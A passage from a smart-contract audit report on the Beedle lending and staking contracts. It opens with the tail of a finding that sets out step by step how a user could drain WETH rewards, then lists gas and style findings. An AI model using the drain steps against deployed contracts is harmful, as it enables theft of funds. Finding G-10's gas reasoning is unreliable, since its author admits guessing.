 *   Then this contract will transfer 112,500,000,000 WETH to the user which is 11.25 (with current WETH implementation with 18 decimals).
 *   The balance of WETH will become 250,000,000,000 - 112,500,000,000 = 137,500,000,000
 *   Then most dangerous if msg.sender call withdraw, the updateFor will call update which will end in the second if, and updateFor will end second if as well,
 *   and contract will return to him 200e24 TKN and he will be 112,500,000,000 WETH drained from here
 */



function update() public {
    uint256 totalSupply = TKN.balanceOf(address(this));
    if (totalSupply > 0) {
        uint256 _balance = WETH.balanceOf(address(this));
        if (_balance > balance) {
            uint256 _diff = _balance - balance;
            if (_diff > 0) {
                uint256 _ratio = _diff * 1e18 / totalSupply;
                if (_ratio > 0) {
                  index = index + _ratio;
                  balance = _balance;
                }
            }
        }
    }
}

/// @notice update the index for a user
/// @param recipient the user to update
function updateFor(address recipient) public {
    update();
    uint256 _supplied = balances[recipient];
    if (_supplied > 0) {
        uint256 _supplyIndex = supplyIndex[recipient];
        supplyIndex[recipient] = index;
        uint256 _delta = index - _supplyIndex;
        if (_delta > 0) {
          uint256 _share = _supplied * _delta / 1e18;
          claimable[recipient] += _share;
        }
    } else {
        supplyIndex[recipient] = index;
    }
}
```

## Impact
Critical, because the user can drain almost all reward tokens if make the math right and also to get his staking tokens back, because of functions not following CEI.

## Tools Used
Manual

## Recommendations
Make constraints to be able to swap tokens with the same decimals or use ERC20.decimals() for precision calculation, also follow CEI in deposit, withdraw and claim functions to not be vulnerable to reentrance, and lastly add a check to not be able to withdraw your deposited tokens after claim reward, or just after claim, set your tokens to 0 as like the reward was set to not be able to withdraw after claim.
## <a id='G-04'></a>G-04. Inconsistent formatting across all the contracts

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro)._      
            


## Summary
There are many different formatting packages used, even in the contract.

Example:
```solidity
event PoolBalanceUpdated(bytes32 indexed poolId, uint256 newBalance);
event PoolInterestRateUpdated(
        bytes32 indexed poolId,
        uint256 newInterestRate
    );
```
## Tools Used
Manual
## Recommendations
Try to use consistent formatting across all the developers, which will make reading and understanding the codebase easier. Add format on save option to avoid forgetting to format the code.
## <a id='G-05'></a>G-05. Cannot use `_burn` Function in Beedle.sol Contract

_Submitted by [0x4ka5h](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [nisedo](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [shanb1605](https://profiles.cyfrin.io/u/undefined), [AkiraKodo](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [ADM](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Beedle.sol#L29-L34

## Summary
The Beedle.sol contract includes an unused internal _burn function which is internal and not being called anywhere within the contract. As it stands, the function is not accessible externally and is effectively "hidden" from external calls. 

## Vulnerability Details
The _burn function in the Beedle.sol contract is defined as an internal function but lacks any internal or derived contract function calls to invoke it. As a result, there is currently no way for external contracts or transactions to access and call the _burn function directly. 

## Impact
Owner will not be able to burn the tokes, owner can only mint without burning with cause hyper inflation. Without the ability to burn tokens, the contract's supply becomes permanently inflationary, which could undermine the token's value and negatively impact its utility and market perception. 

## Tools Used
Manual review

## Recommendations
consider adding this code
```solidity
function burn(address to, uint256 amount) external onlyOwner {
        _burn(to, amount);
    }
````
## <a id='G-06'></a>G-06. Save gas for collecting protocol fees and interests

_Submitted by [qckhp](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [trtrth](https://profiles.cyfrin.io/u/undefined). Selected submission by: [trtrth](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267-L268

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L323-L327

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L403

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L563

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L656

## Summary
When a loan is touched (giving loan, buying loan, refinancing loan, borrowing loan, repaying, seizing loan), protocol fees is calculated and transferred to `feeReceiver`. By implementing like this, users are paying gas fee for governance. This is not gas optimized for users, especially token contract with complex logics (like rebase tokens, fee on transfer tokens...)

## Recommendations
Consider using a storage value to accumulate fee amounts and let `feeReceiver` to call to `Lender` contract to withdraw fees(pull over push pattern).
## <a id='G-07'></a>G-07. Multiple accesses of a mapping/array should use a local variable cache.

_Submitted by [sonny2k](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [0xbug](https://profiles.cyfrin.io/u/undefined), [souilos](https://profiles.cyfrin.io/u/undefined), [Dharma](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xl3xx](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [mambo](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [ericselvig](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [tsar](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [contractsecure](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [alra](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [lian886](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xl3xx](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L145

## Summary

Multiple accesses of a mapping/array should use a local variable cache.

## Vulnerability Details

The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata. [Similar findings](https://github.com/code-423n4/2022-06-infinity-findings/issues/186)

## Impact

There are 66 instances of this issue:

File: [2023-07-beedle/src/Lender.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L145)
```solidity
145: if (p.outstandingLoans != pools[poolId].outstandingLoans)
148: uint256 currentBalance = pools[poolId].poolBalance;
167: if (pools[poolId].lender == address(0)) {
183: if (pools[poolId].lender != msg.sender) revert Unauthorized();
185: _updatePoolBalance(poolId, pools[poolId].poolBalance + amount);
187: IERC20(pools[poolId].loanToken).transferFrom(
199: if (pools[poolId].lender != msg.sender) revert Unauthorized();
201: _updatePoolBalance(poolId, pools[poolId].poolBalance - amount);
203: IERC20(pools[poolId].loanToken).transfer(msg.sender, amount);
211: if (pools[poolId].lender != msg.sender) revert Unauthorized();
213: pools[poolId].maxLoanRatio = maxLoanRatio;
222: if (pools[poolId].lender != msg.sender) revert Unauthorized();
224: pools[poolId].interestRate = interestRate;
234: bytes32 poolId = borrows[i].poolId;
235: uint256 debt = borrows[i].debt;
236: uint256 collateral = borrows[i].collateral;
263: _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
264: pools[poolId].outstandingLoans += debt;
313: pools[poolId].poolBalance + loan.debt + lenderInterest 
315: pools[poolId].outstandingLoans -= loan.debt;
389: pools[poolId].outstandingLoans += totalDebt;
399: pools[oldPoolId].poolBalance + loan.debt + lenderInterest
401: pools[oldPoolId].outstandingLoans -= loan.debt;
417: loans[loanId].lender = pool.lender;
418: loans[loanId].interestRate = pool.interestRate;
419: loans[loanId].startTimestamp = block.timestamp;
420: loans[loanId].auctionStartTimestamp = type(uint256).max;
421: loans[loanId].debt = totalDebt;
427: loans[loanId].debt,
428: loans[loanId].collateral,
449: loans[loanId].auctionStartTimestamp = block.timestamp;
479: if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();
487: if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();
490: _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
491: pools[poolId].outstandingLoans += totalDebt;
501: pools[oldPoolId].poolBalance + loan.debt + lenderInterest
503: pools[oldPoolId].outstandingLoans -= loan.debt;
519: loans[loanId].lender = msg.sender;
520: loans[loanId].interestRate = pools[poolId].interestRate;
521: loans[loanId].startTimestamp = block.timestamp;
522: loans[loanId].auctionStartTimestamp = type(uint256).max;
523: loans[loanId].debt = totalDebt;
529: loans[loanId].debt,
530: loans[loanId].collateral,
531: pools[poolId].interestRate,
576: pools[poolId].outstandingLoans -= loan.debt;
594: uint256 loanId = refinances[i].loanId;
595: bytes32 poolId = refinances[i].poolId;
598: loans[loanId].lender,
599: loans[loanId].loanToken,
600: loans[loanId].collateralToken
603: uint256 debt = refinances[i].debt;
604: uint256 collateral = refinances[i].collateral;
632: pools[oldPoolId].poolBalance + loan.debt + lenderInterest
634: pools[oldPoolId].outstandingLoans -= loan.debt;
637: _updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
638: pools[poolId].outstandingLoans += debt;
660: loans[loanId].debt = debt;
687: loans[loanId].collateral = collateral;
689: loans[loanId].interestRate = pool.interestRate;
691: loans[loanId].startTimestamp = block.timestamp;
693: loans[loanId].auctionStartTimestamp = type(uint256).max;
695: loans[loanId].auctionLength = pool.auctionLength;
697: loans[loanId].lender = pool.lender;
699: pools[poolId].poolBalance -= debt;
734: pools[poolId].poolBalance = newBalance;
```

## Tools Used

Automated review

## Recommendations

Use a local variable cache.
## <a id='G-08'></a>G-08. Modifier gas optimization for onlyOwner modifier

_Submitted by [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [iroh](https://profiles.cyfrin.io/u/undefined). Selected submission by: [inallhonesty](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/utils/Ownable.sol#L10-L13

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d6b63a48ba440ad8d551383697db6e5b0ef84137/contracts/access/Ownable.sol#L45-L64

## Summary

It is recommended to move the modifiers require statements into an internal virtual function. Moreover, the require statement should be replaced with if check + custom error. This reduces the size of compiled contracts that use the modifiers. Putting the check in an internal function decreases contract size when a modifier is used multiple times. The best way of implementing this is presented in OZ's Ownable.sol (Link 2):

```diff
-    modifier onlyOwner() virtual {
-        require(msg.sender == owner, "UNAUTHORIZED");
-        _;
-    }

+modifier onlyOwner() {
+        _checkOwner();
+        _;
+    }

+function _checkOwner() internal view virtual {
+        if (owner() != _msgSender()) {
+            revert OwnableUnauthorizedAccount(_msgSender());
+        }
+    }
```

In Errors.sol:
```diff
+error OwnableUnauthorizedAccount(address sender);
```
## <a id='G-09'></a>G-09. Replace OZ ERC20 with solady ERC20

_Submitted by [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L5-L7

## Summary
Solady's ERC20 implementation is more gas efficient than OZ's version. We recommend to switch to that library instead

## Vulnerability Details

## Impact

## Tools Used
Manual Review

## Recommendations
Switch OZ library to Solady
## <a id='G-10'></a>G-10. += and -= are more expensive 

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [souilos](https://profiles.cyfrin.io/u/undefined), [0xl3xx](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [bbash](https://profiles.cyfrin.io/u/undefined), [Suzombie](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L41

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L48

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L89

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L263

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L388

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L490

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L637

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L314

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L400

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L502

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L575

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L633

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L726

## Summary

## Vulnerability Details
Staking.sol line 41 -> balances[msg.sender] += _amount;
Staking.sol line 48 -> balances[msg.sender] -= _amount;
Staking.sol line 89 -> balances[msg.sender] -= _amount;
Lender.sol line 263 -> pools[poolId].outstandingLoans += debt;
Lender.sol line 388 -> pools[poolId].outstandingLoans += totalDebt; 
Lender.sol line 490 -> pools[poolId].outstandingLoans += totalDebt;
Lender.sol line 637 -> pools[poolId].outstandingLoans += debt;
Lender.sol line 314 -> pools[poolId].outstandingLoans -= loan.debt; 
Lender.sol line 400 -> pools[oldPoolId].outstandingLoans -= loan.debt; 
Lender.sol line 502 -> pools[oldPoolId].outstandingLoans -= loan.debt; 
Lender.sol line 575 -> pools[poolId].outstandingLoans -= loan.debt;
Lender.sol line 633 -> pools[oldPoolId].outstandingLoans -= loan.debt;
Lender.sol line 698 -> pools[poolId].poolBalance -= debt; 
Lender.sol line 726 -> interest -= fees;

In computation the form x= x + y is cheaper than x += y ; and x= x - y is cheaper than x -= y; Not really sure why but have seen this in many audit reports. I guess its related to below :
x +=y can be seen as x += 1(most expensive) about y times and we know that x+=1 is most expensive form versus x++(6 gas less than x+=1) and ++x (5 gas less than x++) 

## Impact
Gas: If we look at all the instances the gas saved adds up.However there is careful consideration as x+=y format is more readable so its important protocol plugs the numbers to see gas savings and see if worth the readability. My take is readability is not that harmed there are code parts longer than x = x + y form in functions, plus I believe its best to put gas more important to save deployment and user costs. 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to use the form x = x + y; or x = x-y; See examples below 
pools[poolId].poolBalance = pools[poolId].poolBalance -debt;
balances[msg.sender] = balances[msg.sender]  + _amount;
## <a id='G-11'></a>G-11. The `for loops` inside the borrow(), repay(), giveLoan() & startAuction() functions in Lender contract are probably gas-guzzlers

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [0xbug](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xscsamurai](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L233-L286

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L292-L293

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L359

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L437-L438

0. The `for loops` inside both the borrow() and repay() functions in the Lender.sol contract are probably gas-guzzlers:

https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L233-L286
https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L292-L293

The functions allows the borrower to open multiple debt positions (`borrows`) or do multiple repayments at once. However, there are several potential gas-related issues in these two functions, which I'll explain below:

- Looping over multiple borrows/repayments: The functions iterate over the `borrows`/repayments array and processes each borrow/repayment request one by one. If the `borrows`/repayments array is large, it could lead to high gas consumption, potentially causing transactions to exceed the block gas limit.

- ERC-20 Token Transfers: The functions perform multiple ERC-20 token transfers, which can be gas-intensive operations, especially if the number of `borrows`/repayments is large. Performing token transfers within a loop can increase the overall gas cost.

- Storage Updates: Inside the loop, the functions update storage values for each borrow/repayment. Writing to storage is more expensive than reading from storage. When this update is combined with looping, it can have a significant impact on gas consumption.

- Multiple Emit Calls: The function emits an event for each borrow/repayment. Emitting events can consume additional gas, especially when done repeatedly inside a loop.

POTENTIAL RISKS:

- nightmare: 
the borrower fails to repay their loans in time, before liquidation is triggered, due to the repay() function running out of gas due to too many repayment loops, and effectively DoS borrower's ability to prevent liquidations in certain specific cases/scenarios. (as an interesting side note, could this be another possible attack vector by rogue lenders/liquidators, where the borrower(s) is the target?...)

- bad: 
high likelihood of quick DoS of borrow()/repay() function when array of borrows/repayments is too large, and too large is probably not that large and can probably happen very quickly due to the high number of EVM operations inside the for loop, including at least 3 token transfers. Borrowers wont be able to borrow/repay from/to more than a few pools at a time before the current call runs out of gas and reverts.

- low: 
borrowers might pay exceedingly high transaction/gas fees for every borrow()/repay() function call.

RECOMMENDATIONS:

At the very least, strongly advisable to implement the following approach:

Instead of doing:

    function borrow(Borrow[] calldata borrows) public {
        for (uint256 i = 0; i < borrows.length; i++) {  
        
Rather implement it this way:

    function borrow(Borrow[] calldata borrows) public {
    		uint256 borrowsLength = borrows.length;
        for (uint256 i; i < borrowsLength; ) {
        		//...
        		// for loop logic
        		//...
        		unchecked {
        				i++;
        		}   
        }
    }

Same applies to repay() function:

    function repay(uint256[] calldata loanIds) public {
        for (uint256 i = 0; i < loanIds.length; i++) {

Rather implement it this way:
        
    function repay(uint256[] calldata loanIds) public {
    		uint256 loanIdsLength = loanIds.length;
        for (uint256 i; i < loanIdsLength; ) {
        		//...
        		// for loop logic
        		//...
        		unchecked {
        				i++;
        		} 
        }
    }
    
Same applies to giveLoan() & startAuction() functions, as per above:
https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L359
https://github.com/Cyfrin/2023-07-beedle/blob/d9718f2ca6521756624c017c90f3d4d4e80da90c/src/Lender.sol#L437-L438

    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
    	uint256 loanIdsLength = loanIds.length;
        for (uint256 i; i < loanIdsLength; ) {
            //...
        		// for loop logic
        		//...
        		unchecked {
        				i++;
        		} 
        }
    }
    
    function startAuction(uint256[] calldata loanIds) public {
    	uint256 loanIdsLength = loanIds.length;
        for (uint256 i; i < loanIdsLength; ) {
            //...
        		// for loop logic
        		//...
        		unchecked {
        				i++;
        		} 
        }
    }

Also, for borrow():

            if (debt < pool.minLoanSize) revert LoanTooSmall();
            if (debt > pool.poolBalance) revert LoanTooLarge();
            if (collateral == 0) revert ZeroCollateral();
            
Can be gas optimized as follows:

						if (collateral == 0) revert ZeroCollateral();
            if (debt < pool.minLoanSize) revert LoanTooSmall();
            if (debt > pool.poolBalance) revert LoanTooLarge();

Additionally, to mitigate these gas-related issues, consider the following optimizations:

- Batching: implement a max limit to the total `for loop` iterations, i.e. limit the number of borrows/repayments that can be processed in a single call to avoid exceeding the block gas limit. Probably not viable to limit the size of the borrows/repayments array, so the above is probably the better approach.

- Gasless Transactions: Consider implementing a gasless transaction mechanism, such as using meta-transactions or gas station networks, to allow users to interact with the contract without paying gas fees directly. This can shift the gas burden from the end-users to relayers or sponsors.

- Gas Token: Explore the usage of gas tokens to refund gas costs. Gas tokens can be minted during low gas price periods and burned during high gas price periods to offset some gas costs.
## <a id='G-12'></a>G-12. Uncheck Arithmetic where overflow/underflow impossible 

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [discardedaccount](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [nmirchev8](https://profiles.cyfrin.io/u/undefined), [souilos](https://profiles.cyfrin.io/u/undefined), [Dharma](https://profiles.cyfrin.io/u/undefined), [0x9527](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [ne0n](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [pks271](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [ericselvig](https://profiles.cyfrin.io/u/undefined), [Suzombie](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined), [sma4](https://profiles.cyfrin.io/u/undefined), [Qiezie](https://profiles.cyfrin.io/u/undefined), [mmm](https://profiles.cyfrin.io/u/undefined), [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined), [c3phas](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [emrekocak](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [MrLegend](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined), [lian886](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [johnlaw](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L233

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L293

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L359

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L438

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L549

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L592

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L41

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L70

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L89

## Summary
Use unchecked blocks in code parts where overflow or underflow is not possible to save on gas 

## Vulnerability Details

## Impact
Gas savings: Solidity compiler from 0.8.0 upwards does default internal overflow and underflow checks for arithmetic.
This adds more computation to functions increasing gas costs. However its possible to use unchecked blocks in order to avoid these compiler operation checks in order to save on gas

## Tools Used
Manual Analysis 

## Recommendations
1. Use the format below for all loops to ensure update i is in unchcheked block
for (uint256 i = 0; ...}
          unchecked { ++i}
 }

2. Use care and check if balance updates e.g 
unchecked { balances[msg.sender] += _amount;} // only if sure _amount cant ever be too large or balances and e.g impact flash loans, token supply taken into account for specific tokens etc. Could potentially gain more gas savings from these updates as long as there is sureness they do not overflow 

3. unchecked {index = index + _ratio;} // only if sure no possibility so high a _ratio e.g flashloan deposit etc 
## <a id='G-13'></a>G-13. Using Private Rather Than Public For Constants,Saves Gas

_Submitted by [0xNiloy](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined), [hunter_w3b](https://profiles.cyfrin.io/u/undefined). Selected submission by: [hunter_w3b](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L59

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L61

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L16-L17

## Summary

Using Private Rather Than Public For Constants,Saves Gas

## Vulnerability Details

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol
```solidity
File: src/Lender.sol

59    uint256 public constant MAX_INTEREST_RATE = 100000;


61    uint256 public constant MAX_AUCTION_LENGTH = 3 days;

```
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L16-L17

```solidity
File: src/Fees.sol

16    ISwapRouter public constant swapRouter =
17        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
```

## <a id='G-14'></a>G-14. Use `!= 0` rather than `> 0`

